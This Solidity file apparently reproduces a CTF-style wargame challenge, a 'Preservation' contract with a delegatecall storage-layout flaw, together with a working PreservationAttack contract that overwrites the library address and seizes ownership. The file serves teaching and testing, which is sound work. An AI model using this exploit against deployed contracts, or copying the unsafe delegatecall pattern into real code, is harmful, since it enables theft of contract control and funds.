// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

// solution used by unit test
// see https://solidity-by-example.org/hacks/delegatecall/
//
// storage layout must be the same for the contract calling delegatecall 
// and the contract getting called. This isn't the case so we can
// override Preservation.timeZone1Library to point to our
// attack contract then implement our own delegated function
// with matching signature to steal the owner
contract PreservationAttack {
  // storage layout must be the same as vulnerable contract  
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  Preservation vulnContract;

  constructor(address _vulnContract) {
    vulnContract =  Preservation(_vulnContract);
  }

  function attack() external {
    // first call overrides Preservation.timeZone1Library to our attack contract
    vulnContract.setFirstTime(uint(uint160(address(this))));
    // second call calls our attack contract's setTime() which steals ownership
    vulnContract.setFirstTime(1);
  }

  function setTime(uint _time) public {
    owner = tx.origin;
  }
}